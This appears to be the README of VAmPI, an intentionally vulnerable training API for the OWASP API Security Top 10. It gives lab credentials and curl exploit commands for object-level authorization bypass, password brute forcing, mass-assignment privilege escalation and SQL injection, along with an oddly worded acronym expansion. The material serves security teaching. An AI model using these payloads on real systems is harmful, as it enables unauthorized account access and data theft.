# VAmPI - Vulnerable API

## Overview
VAmPI (Vulnerable Ass-Model Plugin Interface) is a vulnerable REST API designed to demonstrate OWASP API Security Top 10 vulnerabilities.

## Quick Start

**Access URL**: http://localhost:5000

**API Documentation**: http://localhost:5000/docs

**Default Users**:
- Username: `admin` / Password: `admin`
- Username: `name1` / Password: `pass1`
- Username: `name2` / Password: `pass2`

## API Endpoints

### Public Endpoints
- `GET /` - Home
- `GET /users/v1` - Get all users
- `POST /users/v1/register` - Register new user
- `POST /users/v1/login` - Login

### Protected Endpoints
- `GET /users/v1/{username}` - Get user details
- `PUT /users/v1/{username}/email` - Update email
- `PUT /users/v1/{username}/password` - Update password
- `GET /books/v1` - Get all books
- `POST /books/v1` - Add new book

## Vulnerabilities

### 1. API1:2019 - Broken Object Level Authorization (BOLA)
- **Location**: `/users/v1/{username}`
- **Exploit**: Access other users' data
```bash
# Get another user's details
curl http://localhost:5000/users/v1/admin \
  -H "Authorization: Bearer YOUR_TOKEN"
```

### 2. API2:2019 - Broken User Authentication
- **Location**: `/users/v1/login`
- **Issues**: Weak passwords allowed, no rate limiting
```bash
# Brute force attack
for pass in $(cat passwords.txt); do
  curl -X POST http://localhost:5000/users/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"'$pass'"}'
done
```

### 3. API3:2019 - Excessive Data Exposure
- **Location**: `/users/v1`
- **Issue**: Returns all user data including passwords
```bash
curl http://localhost:5000/users/v1
```

### 4. API4:2019 - Lack of Resources & Rate Limiting
- **Issue**: No rate limiting on any endpoint
- **Exploit**: DoS, brute force attacks

### 5. API5:2019 - Broken Function Level Authorization
- **Location**: `/users/v1/{username}/email`
- **Exploit**: Update other users' data
```bash
# Update another user's email
curl -X PUT http://localhost:5000/users/v1/name2/email \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@evil.com"}'
```

### 6. API6:2019 - Mass Assignment
- **Location**: `/users/v1/register`
- **Exploit**: Set admin privileges during registration
```bash
curl -X POST http://localhost:5000/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"pass","admin":true}'
```

### 7. API7:2019 - Security Misconfiguration
- **Debug mode enabled**: Stack traces exposed
- **CORS misconfigured**: Allows any origin
- **Verbose errors**: Information disclosure

### 8. API8:2019 - Injection
- **SQL Injection** in book search
```bash
curl "http://localhost:5000/books/v1?title=' OR '1'='1"
```

### 9. API9:2019 - Improper Assets Management
- **Old API version** still accessible: `/users/v0`
- **Undocumented endpoints** exposed

### 10. API10:2019 - Insufficient Logging & Monitoring
- **No logging** of authentication failures
- **No monitoring** of suspicious activities

## Testing with Postman

Import the VAmPI collection:
1. Open Postman
2. Import → Link → `https://raw.githubusercontent.com/erev0s/VAmPI/master/postman/VAmPI.postman_collection.json`
3. Set environment variable `host` to `localhost:5000`

## Automated Testing

### Using OWASP ZAP
```bash
# API scan
zap-cli quick-scan --self-contained \
  --start-options '-config api.disablekey=true' \
  http://localhost:5000
```

### Using Burp Suite
1. Configure proxy
2. Import OpenAPI spec from `/docs`
3. Use Scanner to find vulnerabilities

## Learning Objectives
- Understanding OWASP API Security Top 10
- API authentication and authorization
- Rate limiting importance
- Input validation in APIs
- API versioning security

## Defense Mechanisms (What's Missing)
- ❌ Proper authentication (JWT validation)
- ❌ Authorization checks (RBAC)
- ❌ Rate limiting
- ❌ Input validation
- ❌ Secure password storage
- ❌ API versioning strategy
- ❌ Logging and monitoring

## Additional Resources
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)
- [VAmPI GitHub](https://github.com/erev0s/VAmPI) 